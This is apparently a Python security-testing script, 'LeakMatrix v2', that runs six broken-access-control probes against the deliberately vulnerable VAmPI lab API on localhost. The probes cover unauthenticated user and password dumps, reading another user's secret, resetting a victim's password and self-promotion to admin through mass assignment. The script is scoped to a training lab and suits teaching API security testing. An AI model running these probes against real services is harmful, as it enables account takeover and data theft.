#!/usr/bin/env python3
# ============================================================
# LeakMatrix v2 - ALPHA
# BAC / BOLA hunting framework - first live run
# Target: local legal training lab (VAmPI) on your own machine
#
# Methodology (inherited from the Allegro sandbox probes):
#   - triple comparison: baseline (victim token) / attack (attacker token)
#     / control (random resource)
#   - compare response BODIES, not only status codes
#   - every request is stored in an evidence file
#
# Scope discipline: this tool runs ONLY against your own local lab.
# The only write operations are test-data preparation on lab accounts.
#
# Usage:
#   python leakmatrix_v2_alpha.py [optional_base_url]
#   default base url: http://127.0.0.1:5000
# ============================================================

import json
import random
import string
import sys
import uuid

import requests

BASE = sys.argv[1] if len(sys.argv) > 1 else "http://127.0.0.1:5000"
RUN = uuid.uuid4().hex[:6]
EVIDENCE = []
FINDINGS = []


def banner(text):
    print("")
    print("=" * 60)
    print(text)
    print("=" * 60)


def req(method, path, token=None, body=None, label=""):
    headers = {"Content-Type": "application/json"}
    if token:
        headers["Authorization"] = "Bearer " + token
    try:
        r = requests.request(method, BASE + path, headers=headers,
                             json=body, timeout=10)
        shown = r.text.replace("\n", " ")[:220]
        print("  [%s] %s %s -> HTTP %s" % (label, method, path, r.status_code))
        print("        %s" % shown)
        EVIDENCE.append({"label": label, "method": method, "path": path,
                         "status": r.status_code, "body": r.text,
                         "with_token": bool(token)})
        return r.status_code, r.text
    except Exception as exc:
        print("  [!] request error (%s): %s" % (label, exc))
        EVIDENCE.append({"label": label, "method": method, "path": path,
                         "error": str(exc), "with_token": bool(token)})
        return None, ""


def rand_name(prefix):
    suffix = "".join(random.choice(string.ascii_lowercase) for _ in range(4))
    return "%s_%s_%s" % (prefix, RUN, suffix)


def register_user(username, password, as_admin=False):
    payload = {"username": username, "password": password,
               "email": username + "@lab.local"}
    if as_admin:
        payload["admin"] = True
    status, text = req("POST", "/users/v1/register", None, payload,
                       "register " + username)
    return status == 200 and '"success"' in text


def login_user(username, password):
    status, text = req("POST", "/users/v1/login", None,
                       {"username": username, "password": password},
                       "login " + username)
    try:
        return json.loads(text).get("auth_token")
    except Exception:
        return None


def add_finding(number, title, owasp, confirmed):
    tag = "CONFIRMED" if confirmed else "NOT REPRODUCED"
    line = "[%d] %-46s %s (%s)" % (number, title, tag, owasp)
    FINDINGS.append(line)
    print("  ==> %s" % line)


def main():
    print("LeakMatrix v2 (alpha) - run id: %s" % RUN)
    print("Target: %s" % BASE)

    # ---------- 0. health + clean state ----------
    status, text = req("GET", "/", None, None, "health")
    if status != 200 or "Vulnerable API" not in text:
        print("")
        print("[X] VAmPI is not reachable at %s" % BASE)
        print("    Start it first:  python app.py   (keep that window open)")
        sys.exit(1)
    print("[OK] Target is up. Resetting database to a known state ...")
    req("GET", "/createdb", None, None, "db reset")

    # ---------- identities (own lab accounts, test data prep) ----------
    print("")
    print("[*] Preparing two lab identities (attacker / victim) ...")
    victim = rand_name("victim")
    attacker = rand_name("attacker")
    vpass = "VicPass_" + RUN
    apass = "AtkPass_" + RUN
    ok_v = register_user(victim, vpass)
    ok_a = register_user(attacker, apass)
    if not (ok_v and ok_a):
        print("[X] Registration failed - stopping.")
        sys.exit(1)
    vtok = login_user(victim, vpass)
    atok = login_user(attacker, apass)
    if not vtok or not atok:
        print("[X] Login failed - stopping.")
        sys.exit(1)
    print("[OK] Both identities authenticated (JWT received).")

    print("")
    print("[*] Victim plants a private book with a secret ...")
    book_title = "lmxbook_" + RUN
    secret = "LMX-SECRET-" + RUN
    req("POST", "/books/v1", vtok,
        {"book_title": book_title, "secret": secret},
        "victim creates private book")

    # ---------- PROBE 1 ----------
    banner("PROBE 1 - unauthenticated user directory (GET /users/v1)")
    status, text = req("GET", "/users/v1", None, None, "no token")
    try:
        users = json.loads(text).get("users", [])
    except Exception:
        users = []
    print("  users exposed without any token: %d" % len(users))
    add_finding(1, "User directory without authentication", "API8/API3",
                status == 200 and len(users) > 0)

    # ---------- PROBE 2 ----------
    banner("PROBE 2 - debug endpoint dumps passwords (GET /users/v1/_debug)")
    status, text = req("GET", "/users/v1/_debug", None, None, "no token")
    add_finding(2, "Debug endpoint exposes passwords (no auth)", "API8",
                status == 200 and '"password"' in text)

    # ---------- PROBE 3 ----------
    banner("PROBE 3 - user PII without token + existence oracle")
    s1, t1 = req("GET", "/users/v1/" + victim, None, None,
                 "victim detail / no token")
    s2, t2 = req("GET", "/users/v1/ghost_" + RUN, None, None,
                 "control random user")
    add_finding(3, "User PII readable without any token", "API3",
                s1 == 200 and s2 == 404 and victim in t1)

    # ---------- PROBE 4 (flagship triple test) ----------
    banner("PROBE 4 - READ BOLA on victim's private book (triple test)")
    print("  baseline (victim token):")
    sb, tb = req("GET", "/books/v1/" + book_title, vtok, None, "baseline")
    print("  attack (attacker token):")
    sa, ta = req("GET", "/books/v1/" + book_title, atok, None, "attack")
    print("  control (random book, attacker token):")
    sc, tc = req("GET", "/books/v1/ghost_" + RUN, atok, None, "control")
    bodies_match = (tb == ta)
    bola_read = (sb == 200 and sa == 200 and sc == 404
                 and secret in ta and bodies_match)
    print("  baseline/attack bodies identical: %s" % bodies_match)
    add_finding(4, "READ BOLA - attacker reads victim book + secret",
                "API1:2023", bola_read)

    # ---------- PROBE 5 ----------
    banner("PROBE 5 - WRITE BOLA - attacker changes victim's password")
    newpass = "HackedByLMX_" + RUN
    s5, t5 = req("PUT", "/users/v1/%s/password" % victim, atok,
                 {"password": newpass}, "attack write")
    ok_old = login_user(victim, vpass)
    ok_new = login_user(victim, newpass)
    print("  victim login with OLD password: %s" %
          ("FAILED (expected)" if not ok_old else "still works"))
    print("  victim login with NEW password: %s" %
          ("works" if ok_new else "failed"))
    add_finding(5, "WRITE BOLA - attacker set victim's password",
                "API1:2023", s5 in (200, 204) and ok_new and not ok_old)

    # ---------- PROBE 6 ----------
    banner("PROBE 6 - privilege escalation via mass assignment (admin:true)")
    pwned = rand_name("pwned")
    ppass = "PwnPass_" + RUN
    ok_p = register_user(pwned, ppass, as_admin=True)
    ptoken = login_user(pwned, ppass) if ok_p else None
    is_admin = False
    if ptoken:
        s6, t6 = req("GET", "/me", ptoken, None, "whoami pwned")
        try:
            is_admin = json.loads(t6)["data"]["admin"] is True
        except Exception:
            is_admin = False
    add_finding(6, "Mass assignment -> self-promoted admin", "API3:2023",
                is_admin)

    # ---------- summary ----------
    banner("VERDICT SUMMARY")
    for line in FINDINGS:
        print("  " + line)
    confirmed = sum(1 for line in FINDINGS if "CONFIRMED" in line)
    print("")
    print("  Findings reproduced: %d / %d   (expected 6 in vulnerable mode)"
          % (confirmed, len(FINDINGS)))
    print("  Same methodology as the Allegro probes - but here the lab is")
    print("  vulnerable ON PURPOSE, so findings = proof LeakMatrix works.")
    fname = "leakmatrix_v2_alpha_evidence.json"
    with open(fname, "w") as fh:
        json.dump({"run_id": RUN, "base": BASE, "findings": FINDINGS,
                   "evidence": EVIDENCE}, fh, indent=2)
    print("  Evidence saved: %s" % fname)
    print("")
    print("Paste this FULL output back to me.")


if __name__ == "__main__":
    main()

